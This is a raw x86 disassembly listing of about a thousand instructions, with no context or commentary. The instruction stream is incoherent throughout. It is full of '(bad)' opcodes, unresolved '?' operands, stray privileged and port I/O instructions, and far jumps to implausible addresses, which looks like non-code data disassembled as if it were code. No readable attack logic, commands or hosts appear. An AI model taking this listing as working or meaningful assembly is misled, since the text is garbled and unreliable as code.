  40d9e3:	arpl   WORD PTR [edi-0x6e6f3d0a],di
  40d9e9:	lahf   
  40d9ea:	push   edi
  40d9eb:	js     0x40da46
  40d9ed:	sti    
  40d9ee:	adc    edi,DWORD PTR [ebx]
  40d9f0:	mov    ?,WORD PTR ds:0x3679d060
  40d9f6:	mov    esi,0xed3473a4
  40d9fb:	xlat   BYTE PTR ds:[ebx]
  40d9fc:	out    dx,al
  40d9fd:	and    bh,ch
  40d9ff:	or     eax,0x58812472
  40da04:	sbb    al,0xe0
  40da06:	push   esp
  40da07:	mov    esp,0xbb9a14b9
  40da0c:	pop    es
  40da0d:	cmc    
  40da0e:	jb     0x40d9cc
  40da10:	pop    ss
  40da11:	push   edi
  40da12:	test   BYTE PTR [esi+edi*8],ch
  40da15:	mov    al,0xe2
  40da17:	xor    eax,0x724bfc60
  40da1c:	fsub   st,st(1)
  40da1e:	jns    0x40d9ad
  40da20:	or     ebp,0x10b1c985
  40da26:	pop    ebp
  40da27:	repnz shl DWORD PTR [ebx-0x25],1
  40da2b:	imul   eax,DWORD PTR [eax+0x79f000bd],0xffffffa2
  40da32:	push   ebx
  40da33:	imul   edx
  40da35:	xor    BYTE PTR [edx+0x5bf9e624],bl
  40da3b:	inc    edx
  40da3c:	push   ds
  40da3d:	adc    eax,DWORD PTR [ecx+0x1fbeef0]
  40da43:	cmp    esi,0x74
  40da46:	pop    ebp
  40da47:	mov    ebx,DWORD PTR [ebx]
  40da49:	push   edi
  40da4a:	adc    dl,ah
  40da4c:	test   DWORD PTR [esi+0x1e],esp
  40da4f:	(bad)  
  40da51:	mov    eax,ds:0x52ecf496
  40da56:	sbb    ecx,esi
  40da58:	mov    eax,0x1afbca76
  40da5d:	(bad)  
  40da5f:	aas    
  40da60:	xchg   edi,eax
  40da61:	push   es
  40da62:	fstp   TBYTE PTR [ebx+ebx*4-0x37]
  40da66:	into   
  40da67:	pop    ebp
  40da68:	stc    
  40da69:	in     al,0x9d
  40da6b:	cmp    ecx,0x53
  40da6e:	ret    0xbb99
  40da71:	push   0xffffff82
  40da73:	mov    ebp,0xb33f1e23
  40da78:	dec    edx
  40da79:	in     eax,0x5d
  40da7b:	fadd   DWORD PTR [edx-0x42]
  40da7e:	mov    ah,0xff
  40da80:	adc    ebp,DWORD PTR [edi+0x5b]
  40da83:	push   ebp
  40da84:	add    ecx,DWORD PTR [ebp+ecx*4-0x4f]
  40da88:	cmp    BYTE PTR [ebx-0x3],ah
  40da8b:	popa   
  40da8c:	scas   eax,DWORD PTR es:[edi]
  40da8d:	frstor [edx-0x762c38c6]
  40da93:	push   cs
  40da94:	cdq    
  40da95:	int    0x3e
  40da97:	mul    BYTE PTR [ecx]
  40da99:	les    ebx,FWORD PTR [ebx-0x606dae4d]
  40da9f:	add    eax,0x4812818d
  40daa4:	test   BYTE PTR [eax+0x2a7e898f],dl
  40daaa:	mov    ch,0x15
  40daac:	push   ecx
  40daad:	jo     0x40db1d
  40daaf:	vdppd  xmm0,xmm6,XMMWORD PTR [ecx-0x2445bc54],0x3b
  40dab9:	es push ebp
  40dabb:	cld    
  40dabc:	pop    ds
  40dabd:	into   
  40dabe:	aaa    
  40dabf:	test   bl,al
  40dac1:	fsubrp st(4),st
  40dac3:	and    ah,BYTE PTR [ebp-0x3b25cd93]
  40dac9:	fild   DWORD PTR [ecx+0x4]
  40dacc:	stos   BYTE PTR es:[edi],al
  40dacd:	xor    ebp,esp
  40dacf:	pop    esp
  40dad0:	mov    BYTE PTR [esi],dl
  40dad2:	jns    0x40da68
  40dad4:	pop    edx
  40dad5:	int    0x3f
  40dad7:	sbb    DWORD PTR [eax+edx*8-0x5ea1fa52],ebp
  40dade:	fwait
  40dadf:	mov    ebp,0xbaf88e79
  40dae4:	mov    edi,0x2fd3f74
  40dae9:	xor    bl,ah
  40daeb:	dec    ecx
  40daec:	std    
  40daed:	stos   DWORD PTR es:[edi],eax
  40daee:	mov    BYTE PTR [ebx],ah
  40daf0:	xor    eax,0x8d9a255d
  40daf5:	adc    edi,DWORD PTR [esi+0x47]
  40daf8:	imul   edx,DWORD PTR [edi],0x1
  40dafb:	xchg   BYTE PTR fs:[ebx-0x3aba9134],al
  40db02:	(bad)  
  40db03:	(bad)  [edi]
  40db05:	aad    0xd5
  40db07:	test   dl,bh
  40db09:	scas   al,BYTE PTR es:[edi]
  40db0a:	clc    
  40db0b:	lahf   
  40db0c:	or     ch,BYTE PTR [esp+ebx*8+0x5ea268eb]
  40db13:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40db14:	xchg   edi,eax
  40db15:	not    BYTE PTR [edx+eax*2-0xd]
  40db19:	(bad)  
  40db1a:	mov    dl,0x51
  40db1c:	call   0xdf2:0x97ccfaef
  40db23:	outs   dx,DWORD PTR ds:[esi]
  40db24:	leave  
  40db25:	popa   
  40db26:	in     eax,dx
  40db27:	ror    BYTE PTR [edi+0x1d],1
  40db2a:	test   BYTE PTR [ebx-0x39],bl
  40db2d:	jns    0x40dbaa
  40db2f:	pop    ss
  40db30:	hlt    
  40db31:	pop    esi
  40db32:	fs dec edi
  40db34:	xor    bh,BYTE PTR [edi+0x5b]
  40db37:	and    al,0xb4
  40db39:	mov    ebx,0x1628114
  40db3e:	mov    eax,ds:0xae7fae7b
  40db43:	std    
  40db44:	clc    
  40db45:	(bad)  
  40db46:	mov    ebx,0xc8389a4a
  40db4b:	sub    al,0xea
  40db4d:	pusha  
  40db4e:	mov    dl,cl
  40db50:	fiadd  DWORD PTR [edx-0x2e6b2e05]
  40db56:	or     eax,0xb2a2a760
  40db5b:	sub    eax,0x2d6e77b8
  40db60:	and    eax,0x3d402e2e
  40db65:	bound  ebp,QWORD PTR [edi]
  40db67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40db68:	jmp    0x1985:0xe4554dd9
  40db6f:	mov    cl,0xc0
  40db71:	aaa    
  40db72:	jo     0x40db50
  40db74:	cli    
  40db75:	cmp    BYTE PTR [eax-0x681cb4e0],al
  40db7b:	loop   0x40dba2
  40db7d:	jno    0x40dbc7
  40db7f:	and    BYTE PTR ds:0x8a62789a,dl
  40db85:	dec    ebp
  40db86:	sub    al,0x5b
  40db88:	in     eax,0x23
  40db8a:	push   edx
  40db8b:	pop    edx
  40db8c:	mov    dh,0x89
  40db8e:	mov    ds:0xad7e375,al
  40db93:	jp     0x40dbea
  40db95:	push   cs
  40db96:	std    
  40db97:	jns    0x40dbf9
  40db99:	add    BYTE PTR [edx],dh
  40db9b:	mov    ds:0x79744a33,al
  40dba0:	out    dx,al
  40dba1:	xchg   ecx,eax
  40dba2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dba3:	mov    edx,0xe796eff3
  40dba8:	popf   
  40dba9:	ret    
  40dbaa:	push   ebx
  40dbab:	sbb    dl,BYTE PTR [edi-0x14031b74]
  40dbb1:	cwde   
  40dbb2:	cdq    
  40dbb3:	mov    ds:0x9644a1ed,eax
  40dbb8:	pop    edx
  40dbb9:	pop    es
  40dbba:	xlat   BYTE PTR ds:[ebx]
  40dbbb:	xor    eax,0xaecc200c
  40dbc0:	iret   
  40dbc1:	(bad)  
  40dbc2:	div    DWORD PTR [edx+0x40702e43]
  40dbc8:	dec    edx
  40dbc9:	and    DWORD PTR [ecx],esp
  40dbcb:	mov    edi,0x870eee5f
  40dbd0:	mov    ah,BYTE PTR [ebp+0x17]
  40dbd3:	cmp    eax,0xbc0cbbd7
  40dbd8:	pop    es
  40dbd9:	popa   
  40dbda:	lahf   
  40dbdb:	mov    ebx,0xba0efa1b
  40dbe0:	imul   edx,edi,0x2
  40dbe3:	call   0xcc877b82
  40dbe8:	jge    0x40dbfa
  40dbea:	and    al,0x1a
  40dbec:	mov    ebx,0xd38590ee
  40dbf1:	push   ds
  40dbf2:	pushf  
  40dbf3:	and    eax,0x9a23c49e
  40dbf8:	cmp    al,BYTE PTR [esi]
  40dbfa:	out    0xd9,al
  40dbfc:	pop    ecx
  40dbfd:	and    eax,0x2009dcbb
  40dc02:	and    eax,0x5dcc4f31
  40dc07:	xor    al,0x29
  40dc09:	jmp    0x40dc47
  40dc0b:	aas    
  40dc0c:	(bad)  
  40dc0d:	cdq    
  40dc0e:	adc    ebp,DWORD PTR ds:0x32f237f6
  40dc14:	dec    ecx
  40dc15:	ss push edx
  40dc17:	hlt    
  40dc18:	jmp    0x69dd:0x64fc51a1
  40dc1f:	loop   0x40dbee
  40dc21:	xchg   ecx,eax
  40dc22:	or     ch,BYTE PTR [edx+0x16d7d104]
  40dc28:	or     al,0x5e
  40dc2a:	mov    esp,DWORD PTR [ebp+0x708a8de6]
  40dc30:	dec    esp
  40dc31:	stos   BYTE PTR es:[edi],al
  40dc32:	ret    0x5d20
  40dc35:	add    BYTE PTR [ebx],ah
  40dc37:	jmp    0x40dbd6
  40dc39:	(bad)  
  40dc3a:	into   
  40dc3b:	jecxz  0x40dc0b
  40dc3d:	push   cs
  40dc3e:	sub    eax,edi
  40dc40:	mov    esp,0x9a5cfc5e
  40dc45:	dec    eax
  40dc46:	push   ebp
  40dc47:	ins    BYTE PTR es:[edi],dx
  40dc48:	or     dh,ah
  40dc4a:	in     eax,dx
  40dc4b:	cli    
  40dc4c:	pop    ss
  40dc4d:	mov    al,0x67
  40dc4f:	nop
  40dc50:	mov    WORD PTR [ecx-0xa],gs
  40dc53:	xchg   ecx,eax
  40dc54:	mov    al,0xbf
  40dc56:	shr    DWORD PTR [edx],cl
  40dc58:	push   ebp
  40dc59:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dc5a:	aad    0x2d
  40dc5c:	xor    cl,dh
  40dc5e:	fwait
  40dc5f:	into   
  40dc60:	scas   al,BYTE PTR es:[edi]
  40dc61:	add    al,BYTE PTR [edx-0x41]
  40dc64:	or     al,0x4f
  40dc66:	pop    ss
  40dc67:	xor    ebx,DWORD PTR [ebx+0x7d]
  40dc6a:	mov    DWORD PTR [eax+eiz*2-0x60849ded],ebx
  40dc71:	das    
  40dc72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dc73:	dec    edx
  40dc74:	fwait
  40dc75:	dec    esi
  40dc76:	add    cl,al
  40dc78:	xchg   ebx,eax
  40dc79:	mov    cl,0xd9
  40dc7b:	bound  ecx,QWORD PTR [ebp+0x59]
  40dc7e:	lock mov esp,0x9953da36
  40dc84:	adc    al,0x69
  40dc86:	mov    ch,0xa9
  40dc88:	call   0x960d:0x2c18fc2e
  40dc8f:	sbb    ebp,DWORD PTR [edi-0x41]
  40dc92:	mov    edi,0xb85a2986
  40dc97:	push   ebp
  40dc98:	adc    ch,BYTE PTR [ebp-0x1f]
  40dc9b:	in     eax,0xdf
  40dc9d:	aas    
  40dc9e:	add    ch,BYTE PTR [edx]
  40dca0:	mov    dl,BYTE PTR [edx-0x49]
  40dca3:	cmp    DWORD PTR [ecx],0x3e
  40dca6:	dec    ebp
  40dca7:	neg    BYTE PTR [ecx]
  40dca9:	hlt    
  40dcaa:	and    bh,bh
  40dcac:	(bad)  
  40dcaf:	aam    0xcd
  40dcb1:	inc    edx
  40dcb2:	xchg   ecx,eax
  40dcb3:	ds inc eax
  40dcb5:	loop   0x40dd07
  40dcb7:	outs   dx,BYTE PTR ds:[esi]
  40dcb8:	jl     0x40dd38
  40dcba:	lea    ebp,[esi-0x7bfc82c1]
  40dcc0:	cwde   
  40dcc1:	ss inc esi
  40dcc3:	mov    esp,0x5afbcd2f
  40dcc8:	and    esi,edi
  40dcca:	pop    ss
  40dccb:	or     al,0x44
  40dccd:	cmp    eax,0xa47093c7
  40dcd2:	jnp    0x40dcaf
  40dcd4:	fcomp  st(7)
  40dcd6:	mov    ss,WORD PTR [eax+eiz*1+0x63]
  40dcda:	test   eax,0x3e4f1cf6
  40dcdf:	inc    ebp
  40dce0:	or     DWORD PTR [ebx-0x5b68a8fc],0xffffffa3
  40dce7:	mov    dl,0x2a
  40dce9:	dec    edx
  40dcea:	or     DWORD PTR [ecx+0x5df173b1],ebp
  40dcf0:	imul   esp,DWORD PTR [ebp-0x7d52be93],0xffffffd4
  40dcf7:	(bad)  
  40dcf8:	repz push ss
  40dcfa:	push   ecx
  40dcfb:	cli    
  40dcfc:	(bad)  
  40dcfd:	das    
  40dcfe:	mov    edx,0xd9dd3223
  40dd03:	mov    ebx,DWORD PTR [ebx]
  40dd05:	nop
  40dd06:	inc    eax
  40dd07:	jnp    0x40dcfd
  40dd09:	iret   
  40dd0a:	(bad)  
  40dd0b:	or     al,0xf2
  40dd0d:	inc    ecx
  40dd0e:	mov    edx,0x8b98c625
  40dd13:	icebp  
  40dd14:	dec    ecx
  40dd15:	dec    ebx
  40dd16:	jno    0x40dd62
  40dd18:	(bad)  
  40dd19:	mov    ah,0xf8
  40dd1b:	mov    dl,0x28
  40dd1d:	psubsw mm6,QWORD PTR [esi-0x63]
  40dd21:	lods   al,BYTE PTR ds:[esi]
  40dd22:	dec    ebp
  40dd23:	mov    al,0xb7
  40dd25:	adc    al,0x68
  40dd27:	fwait
  40dd28:	mov    ecx,0x8806dba3
  40dd2d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dd2e:	xchg   DWORD PTR [esi-0x7e38f987],esp
  40dd34:	(bad)  
  40dd35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dd36:	and    eax,0xe4799ca3
  40dd3b:	xor    ah,BYTE PTR [eax+0x388c8926]
  40dd41:	dec    edi
  40dd42:	jp     0x40dcfe
  40dd44:	adc    ebx,ebx
  40dd46:	jno    0x40dcd2
  40dd48:	pop    ebp
  40dd49:	mov    cl,0x1b
  40dd4b:	cmp    edi,DWORD PTR [esi-0x76]
  40dd4e:	bound  ebx,QWORD PTR [ecx-0x5c]
  40dd51:	enter  0x5aa,0x1e
  40dd55:	aad    0x58
  40dd57:	push   0xd4e67a76
  40dd5c:	mov    BYTE PTR [esi-0x404ed0f7],ah
  40dd62:	loop   0x40ddce
  40dd64:	test   DWORD PTR [esi+edi*8-0x37],ebx
  40dd68:	push   es
  40dd69:	xchg   DWORD PTR ds:0x602b6e3f,ebx
  40dd6f:	fidivr DWORD PTR [ebp+0x1010f627]
  40dd75:	inc    ecx
  40dd76:	cwde   
  40dd77:	push   edx
  40dd78:	xchg   esp,eax
  40dd79:	inc    esp
  40dd7a:	and    BYTE PTR [ebx+0x23327071],0xd6
  40dd81:	jecxz  0x40dd23
  40dd83:	and    dh,0xa2
  40dd86:	pop    ds
  40dd87:	retf   0xeddf
  40dd8a:	pop    es
  40dd8b:	mov    dl,BYTE PTR [ebp-0x7da4e13d]
  40dd91:	sar    BYTE PTR [edx+0x7f],0x25
  40dd95:	or     BYTE PTR [ecx+0x31c6d043],0xf4
  40dd9c:	jmp    0x84568705
  40dda1:	adc    bh,BYTE PTR [ecx+0x44]
  40dda4:	push   edx
  40dda5:	shl    bl,1
  40dda7:	out    dx,eax
  40dda8:	scas   al,BYTE PTR es:[edi]
  40dda9:	fcomi  st,st(1)
  40ddab:	aad    0xf5
  40ddad:	inc    esi
  40ddae:	xchg   DWORD PTR [ebp+0x7bdbbb95],ebp
  40ddb4:	aad    0xe
  40ddb6:	test   DWORD PTR [edx+0x4bfd6fed],edi
  40ddbc:	test   BYTE PTR [eax-0x11],al
  40ddbf:	push   ebx
  40ddc0:	mov    ds:0x803342cd,eax
  40ddc5:	add    DWORD PTR [ebx-0x3e],edx
  40ddc8:	lods   eax,DWORD PTR ds:[esi]
  40ddc9:	mov    ch,0x16
  40ddcb:	cmp    DWORD PTR [edi+eiz*8-0x41],edi
  40ddcf:	mov    ebp,0xc34077e2
  40ddd4:	push   ecx
  40ddd5:	mov    dh,0x39
  40ddd7:	and    eax,0xd823f3ea
  40dddc:	adc    al,0xb5
  40ddde:	(bad)  
  40dddf:	inc    DWORD PTR [eax-0x39]
  40dde2:	(bad)  
  40dde3:	jne    0x40de4b
  40dde5:	inc    ecx
  40dde6:	adc    ecx,0x24
  40dde9:	dec    edi
  40ddea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ddeb:	scas   al,BYTE PTR es:[edi]
  40ddec:	outs   dx,DWORD PTR ds:[esi]
  40dded:	out    0x85,al
  40ddef:	stc    
  40ddf0:	cwde   
  40ddf1:	dec    ebp
  40ddf2:	or     al,BYTE PTR [eax+0x7cbe729c]
  40ddf8:	(bad)  
  40ddf9:	push   ds
  40ddfa:	xor    dh,BYTE PTR [edx-0x844d8af]
  40de00:	fist   DWORD PTR [eax-0x1287a4e7]
  40de06:	fstp   DWORD PTR [edi-0x6]
  40de09:	jmp    0x40de34
  40de0b:	jmp    0x7969:0x14549962
  40de12:	push   ebx
  40de13:	inc    ebp
  40de14:	scas   eax,DWORD PTR es:[edi]
  40de15:	int3   
  40de16:	das    
  40de17:	or     al,0xec
  40de19:	imul   BYTE PTR [edx]
  40de1b:	push   esp
  40de1c:	mov    WORD PTR [ebx],fs
  40de1e:	std    
  40de1f:	sbb    esp,edi
  40de21:	(bad)  
  40de22:	retf   0xa656
  40de25:	icebp  
  40de26:	cmp    ah,dl
  40de28:	mov    bl,0x4d
  40de2a:	ret    0x83dd
  40de2d:	jno    0x40de63
  40de2f:	dec    ebx
  40de30:	pop    ss
  40de31:	cmp    DWORD PTR [ebx+0x33c3306f],0xfbdb3a69
  40de3b:	add    al,0x9
  40de3d:	sbb    al,0xb8
  40de3f:	inc    ecx
  40de40:	xchg   edx,eax
  40de41:	and    DWORD PTR [edx-0x4c48dfbb],edi
  40de47:	push   ecx
  40de48:	outs   dx,BYTE PTR ds:[esi]
  40de49:	xchg   edi,eax
  40de4a:	cs cmp eax,0x9e6d8e06
  40de50:	lods   al,BYTE PTR ds:[esi]
  40de51:	sub    dl,BYTE PTR [edi]
  40de53:	mov    esp,0x86457a58
  40de58:	inc    ebx
  40de59:	mov    cl,0x35
  40de5b:	arpl   WORD PTR [esi+0x3a8ea213],si
  40de61:	jp     0x40dea4
  40de63:	ret    0xda6d
  40de66:	es push 0xf295f64
  40de6c:	push   0x47
  40de6e:	adc    ch,dl
  40de70:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40de71:	mov    bl,0xac
  40de73:	fwait
  40de74:	inc    ecx
  40de75:	adc    bh,bh
  40de77:	push   ss
  40de78:	int3   
  40de79:	jo     0x40de0a
  40de7b:	add    esi,edi
  40de7d:	nop
  40de7e:	imul   ecx,DWORD PTR [eax+0x57],0xffffffe3
  40de82:	sbb    bl,dl
  40de84:	in     eax,dx
  40de85:	pop    esp
  40de86:	jmp    0x15cbcc69
  40de8b:	jbe    0x40de80
  40de8d:	clc    
  40de8e:	xchg   ch,cl
  40de90:	sbb    DWORD PTR [ebp+0x3c73b780],eax
  40de96:	cmp    edi,DWORD PTR [edx+0x77d68a72]
  40de9c:	xor    DWORD PTR [eax+0x40],ebx
  40de9f:	mov    al,ds:0x4da4e2f8
  40dea4:	loopne 0x40df11
  40dea6:	mov    ebp,0x66411552
  40deab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40deac:	dec    esi
  40dead:	pop    eax
  40deae:	(bad)  
  40deaf:	cmp    al,BYTE PTR [ebx+0x63]
  40deb2:	inc    edx
  40deb3:	xor    DWORD PTR [ebx],edx
  40deb5:	repnz ficomp WORD PTR [ebx+0x7e]
  40deb9:	(bad)  
  40deba:	loop   0x40de5f
  40debc:	ins    BYTE PTR es:[edi],dx
  40debd:	in     eax,dx
  40debe:	push   ss
  40debf:	jne    0x40df19
  40dec1:	rcr    BYTE PTR ds:[ebp-0x2d04a77d],cl
  40dec8:	pop    eax
  40dec9:	fcmovbe st,st(3)
  40decb:	xchg   edx,eax
  40decc:	xor    BYTE PTR [ebx],ah
  40dece:	in     eax,dx
  40decf:	pop    ebp
  40ded0:	retf   
  40ded1:	adc    al,0x9f
  40ded3:	mov    ds:0x54756a56,eax
  40ded8:	push   cs
  40ded9:	ret    
  40deda:	fcmovu st,st(2)
  40dedc:	dec    eax
  40dedd:	or     BYTE PTR [esp-0x1d02f712],ch
  40dee4:	enter  0xa476,0x3d
  40dee8:	stos   DWORD PTR es:[edi],eax
  40dee9:	hlt    
  40deea:	jne    0x40de79
  40deec:	mov    eax,0xba86978d
  40def1:	mov    BYTE PTR [esp+eiz*2-0x7658bcd7],bh
  40def8:	lds    ecx,FWORD PTR [ebx+0x7e2c601a]
  40defe:	mov    esp,0x87fcc47f
  40df03:	cmp    al,0xf0
  40df05:	mov    ds:0x3c77698c,al
  40df0a:	pop    ebx
  40df0b:	leave  
  40df0c:	mov    ebx,0x8d81c705
  40df11:	xor    DWORD PTR [ebx-0x79bd9630],esp
  40df17:	shr    BYTE PTR [eax-0x59],cl
  40df1a:	pop    ebp
  40df1b:	imul   esp,DWORD PTR gs:0xf8a0afff,0x7b
  40df23:	push   edx
  40df24:	pop    esp
  40df25:	mov    ah,0xbe
  40df27:	mov    ds:0x64dc1797,eax
  40df2c:	sub    al,0xd1
  40df2e:	push   edi
  40df2f:	lock data16 or al,0x3c
  40df33:	and    eax,0x92a6a3b
  40df38:	lock icebp 
  40df3a:	and    ecx,DWORD PTR [edi+ebx*8]
  40df3d:	sbb    dl,BYTE PTR [edx+0x2c4f8407]
  40df43:	add    BYTE PTR [ecx+0x6f],ah
  40df46:	add    al,0x3e
  40df48:	push   ds
  40df49:	shl    DWORD PTR ds:0x4b8e26fe,cl
  40df4f:	call   0x6b3fad1e
  40df54:	push   ss
  40df55:	or     eax,0xaf9a483d
  40df5a:	into   
  40df5b:	add    BYTE PTR [ebp+ecx*8-0x30],0x62
  40df60:	sub    dh,bh
  40df62:	adc    eax,0x92336e51
  40df67:	nop
  40df68:	mov    ?,WORD PTR [ebx+0x33]
  40df6b:	pop    esi
  40df6c:	sub    bh,BYTE PTR [edx+0x3d]
  40df6f:	lods   al,BYTE PTR ds:[esi]
  40df70:	clc    
  40df71:	xor    ecx,DWORD PTR ss:[ebp+0x4d]
  40df75:	inc    edi
  40df76:	cmp    dh,dl
  40df78:	xchg   esi,eax
  40df79:	call   0xed69:0xcc954757
  40df80:	add    DWORD PTR [edi-0x17],0xf4cb512a
  40df87:	dec    esp
  40df88:	mov    cl,0x13
  40df8a:	xlat   BYTE PTR ds:[ebx]
  40df8b:	add    DWORD PTR [edx-0x726ed689],esp
  40df91:	lock mov ecx,0x5568b61e
  40df97:	hlt    
  40df98:	mov    ebx,0x7f2e8f3e
  40df9d:	inc    ecx
  40df9e:	jae    0x40df7c
  40dfa0:	data16 or ch,BYTE PTR [esp-0x77af2101]
  40dfa8:	stc    
  40dfa9:	adc    bh,BYTE PTR [esi-0x6ed4bc74]
  40dfaf:	xchg   bl,ah
  40dfb1:	pop    es
  40dfb2:	iret   
  40dfb3:	aad    0x8a
  40dfb5:	sbb    ecx,esp
  40dfb7:	ds in  eax,dx
  40dfb9:	addr16 clc 
  40dfbb:	jl     0x40df64
  40dfbd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dfbe:	ror    DWORD PTR [ebx],cl
  40dfc0:	xor    al,0xdf
  40dfc2:	pop    ebx
  40dfc3:	xor    edi,DWORD PTR [ecx+0x20]
  40dfc6:	pop    eax
  40dfc7:	imul   edx,DWORD PTR [ecx+edi*1-0x5],0x73f4e7e5
  40dfcf:	sbb    DWORD PTR [edi-0x276e21e],edx
  40dfd5:	sub    eax,0x6704b2a
  40dfda:	das    
  40dfdb:	or     BYTE PTR [eax-0x5],al
  40dfde:	and    DWORD PTR [ebx+0x21],ebx
  40dfe1:	frstor [ebx+0x7f907753]
  40dfe7:	inc    ecx
  40dfe8:	mov    eax,0x339c443a
  40dfed:	mov    ?,WORD PTR [edx]
  40dfef:	sub    ah,BYTE PTR [edi-0x34fd4bb]
  40dff5:	cli    
  40dff6:	cld    
  40dff7:	jg     0x40e011
  40dff9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dffa:	mov    ebx,0x32d4f7a2
  40dfff:	xchg   ebp,eax
  40e000:	pop    ebx
  40e001:	sub    cl,cl
  40e003:	xor    eax,0xfd5cdc0a
  40e008:	fisttp WORD PTR [esi-0x54f697fa]
  40e00e:	mov    edi,0x19d86a65
  40e013:	into   
  40e014:	inc    esi
  40e015:	adc    ebp,DWORD PTR [edx-0x3c]
  40e018:	ds inc ecx
  40e01a:	and    eax,0xa95a21f2
  40e01f:	sub    esp,DWORD PTR [eax]
  40e021:	push   ebx
  40e022:	jl     0x40dfd3
  40e024:	retf   
  40e025:	jl     0x40e087
  40e027:	cmc    
  40e028:	clc    
  40e029:	sub    ah,dl
  40e02b:	popa   
  40e02c:	cmc    
  40e02d:	enter  0xefc6,0xbe
  40e031:	and    DWORD PTR [eax-0x6a],0xffffffea
  40e035:	(bad)  
  40e036:	dec    ebp
  40e037:	pop    DWORD PTR [esi+0x39]
  40e03a:	test   al,0x2c
  40e03c:	jb     0x40e058
  40e03e:	jo     0x40e01a
  40e040:	push   cs
  40e041:	loopne 0x40e035
  40e043:	mov    eax,ds:0xf0683e72
  40e048:	js     0x40e025
  40e04a:	jb     0x40e0af
  40e04c:	in     al,dx
  40e04d:	adc    esi,DWORD PTR [ebp-0x3f7cf249]
  40e053:	(bad)  
  40e054:	aad    0x68
  40e056:	inc    esi
  40e057:	dec    edx
  40e058:	sbb    al,0x55
  40e05a:	loopne 0x40dff1
  40e05c:	pop    ss
  40e05d:	add    eax,0x20148b9d
  40e062:	loopne 0x40e04e
  40e064:	xchg   esi,eax
  40e065:	cli    
  40e066:	push   ebp
  40e067:	fldenv [esi]
  40e069:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e06a:	add    DWORD PTR [ebx-0x53],ecx
  40e06d:	sbb    ah,al
  40e06f:	rol    BYTE PTR [edx-0x50],0x2a
  40e073:	aam    0x53
  40e075:	dec    edi
  40e076:	adc    eax,0x6c4656a6
  40e07b:	(bad)  
  40e07c:	hlt    
  40e07d:	xchg   ebp,eax
  40e07e:	mov    esp,0x9fb06c36
  40e083:	in     eax,dx
  40e084:	jecxz  0x40e08c
  40e086:	mov    eax,DWORD PTR [edi]
  40e088:	pop    edx
  40e089:	dec    eax
  40e08a:	pop    esp
  40e08b:	and    edi,DWORD PTR [ebx-0x31863e2d]
  40e091:	or     al,0x68
  40e093:	pushf  
  40e094:	xchg   DWORD PTR [edi+ecx*1-0x16466462],esi
  40e09b:	shr    DWORD PTR [edx+ebp*1-0x32300d58],cl
  40e0a2:	in     eax,dx
  40e0a3:	rcl    DWORD PTR [edx-0x6da150b4],1
  40e0a9:	sub    dh,ah
  40e0ab:	pop    ebx
  40e0ac:	sub    al,0x61
  40e0ae:	(bad)  
  40e0af:	test   ax,0x35c0
  40e0b3:	mov    eax,ds:0x9bc371e6
  40e0b8:	nop
  40e0b9:	push   esi
  40e0ba:	leave  
  40e0bb:	or     DWORD PTR [esi-0x7b5b0bf],ebx
  40e0c1:	xchg   edi,eax
  40e0c2:	lea    eax,[ecx+eax*4]
  40e0c5:	sub    dl,BYTE PTR [edx-0x3f]
  40e0c8:	mov    esi,0xd8fe0a76
  40e0cd:	mov    ah,0x34
  40e0cf:	pusha  
  40e0d0:	pop    es
  40e0d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e0d2:	sub    esi,DWORD PTR [edi+edi*8-0x42437ded]
  40e0d9:	and    eax,0x2d83213e
  40e0de:	add    al,0xec
  40e0e0:	das    
  40e0e1:	pop    ds
  40e0e2:	mov    bl,0x60
  40e0e4:	daa    
  40e0e5:	(bad)  
  40e0e6:	adc    DWORD PTR [eax+0x58],ebx
  40e0e9:	mov    WORD PTR [ebx+0x5da7e88e],?
  40e0ef:	popf   
  40e0f0:	dec    esi
  40e0f1:	ficom  DWORD PTR [esi]
  40e0f3:	ins    DWORD PTR es:[edi],dx
  40e0f4:	(bad)  
  40e0f5:	adc    eax,0xdf7263c
  40e0fa:	loope  0x40e16a
  40e0fc:	repnz push ss
  40e0fe:	sahf   
  40e0ff:	aas    
  40e100:	xchg   DWORD PTR [edx+eiz*8],ebx
  40e103:	sub    DWORD PTR [edx],ebp
  40e105:	pop    eax
  40e106:	movntps XMMWORD PTR [eax-0x22],xmm2
  40e10a:	mov    ah,0xaa
  40e10c:	mov    edx,0xaa3732b9
  40e111:	xor    eax,0x72081258
  40e116:	lods   eax,DWORD PTR ds:[esi]
  40e117:	bound  eax,QWORD PTR [ebp-0x52]
  40e11a:	mov    eax,DWORD PTR [eax-0x36]
  40e11d:	and    eax,0x5331b748
  40e122:	and    al,0x47
  40e124:	sahf   
  40e125:	in     al,dx
  40e126:	xor    al,0x49
  40e128:	rep outs dx,BYTE PTR ds:[esi]
  40e12a:	rol    dl,0x65
  40e12d:	mov    al,ds:0x39aebe4f
  40e132:	daa    
  40e133:	arpl   ax,cx
  40e135:	add    esi,DWORD PTR [esi-0x232d4124]
  40e13b:	xlat   BYTE PTR ds:[ebx]
  40e13c:	lods   eax,DWORD PTR ds:[esi]
  40e13d:	fimul  DWORD PTR [ebx+0x64ab3e88]
  40e143:	popf   
  40e144:	leave  
  40e145:	arpl   WORD PTR [edi+edi*8+0x7c],ax
  40e149:	outs   dx,BYTE PTR ds:[esi]
  40e14a:	jmp    0xacbb:0x40fb5fbe
  40e151:	add    edx,eax
  40e153:	xchg   ebp,eax
  40e154:	stos   BYTE PTR es:[edi],al
  40e155:	mov    bh,0x19
  40e157:	loop   0x40e19e
  40e159:	mov    esp,0x876d05e5
  40e15e:	jle    0x40e0e5
  40e160:	jnp    0x40e112
  40e162:	xor    al,0x5
  40e164:	mov    ds:0xd3b1d557,eax
  40e169:	xchg   esi,eax
  40e16a:	shl    edx,cl
  40e16c:	inc    si
